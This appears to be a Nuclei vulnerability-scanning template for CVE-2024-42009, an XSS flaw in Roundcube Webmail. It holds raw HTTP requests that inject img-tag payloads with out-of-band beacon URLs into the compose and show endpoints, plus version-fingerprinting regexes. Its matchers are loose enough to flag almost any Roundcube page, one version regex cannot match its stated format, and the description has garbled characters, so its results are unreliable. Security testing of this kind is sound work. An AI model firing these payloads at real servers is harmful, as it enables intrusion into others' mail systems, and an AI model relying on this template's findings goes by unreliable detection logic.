id: CVE-2024-42009

info:
  name: Roundcube Reflected XSS
  author: Shubhankargupta691
  severity: critical
  description: |
    Reflected XSS in Roundcube message_body() (program/actions/mail/show.php).
    This template generates a per-run token and attempts multiple lightweight injection vectors
    (compose prefill and show endpoint). Verification is done via Out-Of-Band callbacks
    using the {{interactsh-url}} placeholder (no version-only detection).
    Affected Component: message_body() in show.php

    NOTE: This template injects OOB beacons to prove JS execution. It does NOT open emails
    in a browser â€” you must open the message manually (or with a headless browser) to trigger
    the beacon. The template also extracts the product version (below) so triage can see the
    exact Roundcube version returned by the target.

  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-42009
    - https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
    - https://github.com/Bhanunamikaze/CVE-2024-42009
    - https://github.com/0xbassiouny1337/CVE-2024-42009
  tags:
    - cve
    - roundcube
    - xss
    - oob
    - interactsh
  classification:
    cve-id: CVE-2024-42009
    cvss-score: 9.8
    cpe: 'cpe:2.3:a:roundcube:webmail'

variables:
  # unique token per run (valid helper)
  uid_token: "{{rand_str_alpha(8)}}"                       
  payload_img: "<img src=\"https://{{interactsh-url}}/{{uid_token}}\" onerror=\"this.onerror=null\">"

requests:
  - id: fingerprint-root
    name: roundcube-root-fingerprint
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: word
        part: body
        words:
          - "Roundcube Webmail"
          - "Roundcube"

  - id: compose-prefill
    name: roundcube-compose-prefill-inject
    raw:
      - |
        GET /?_task=mail&_action=compose&_to=attacker@example.com&_subject={{uid_token}}&_message=<img src="https://{{interactsh-url}}/{{uid_token}}" HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
      - type: regex
        part: body
        regex:
          - "(?i)compose"

  - id: show-endpoint
    name: roundcube-show-endpoint-inject
    raw:
      - |
        GET /?_task=mail&_action=show&_uid={{uid_token}}&_mbox=INBOX&x=<img src="https://{{interactsh-url}}/{{uid_token}}"> HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
      - type: regex
        part: body
        regex:
          - "(?i)Roundcube"
    extractors:
      - type: regex
        part: body
        regex:
          - '{{uid_token}}'

  - id: version-check
    name: roundcube-version-check
    method: GET
    path:
      - "{{BaseURL}}/README"
      - "{{BaseURL}}/?_task=login"
    # 1) extractor will pull a version string if present
    extractors:
      - type: regex
        part: body
        # capture common forms like "Roundcube 1.6.7" or "Roundcube Version: 1.6.7"
        regex:
          - '(?i)Roundcube(?:\s*Version[:\s]*)?\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)'
    matchers-condition: or
    matchers:
      # 2) try to match known vulnerable versions (1.5.x up to 1.5.7, 1.6.x up to 1.6.7)
      - type: regex
        part: body
        regex:
          - '(?i)Roundcube(?:\s*Version[:\s]*)?(?:1\.5\.(?:[0-7])|1\.6\.(?:[0-7]))'
      - type: regex
        part: body
        regex:
          - '(?i)Roundcube(?:\s*Version[:\s]*)?(?:1\.5|1\.6)'

stop-at-first-match: true
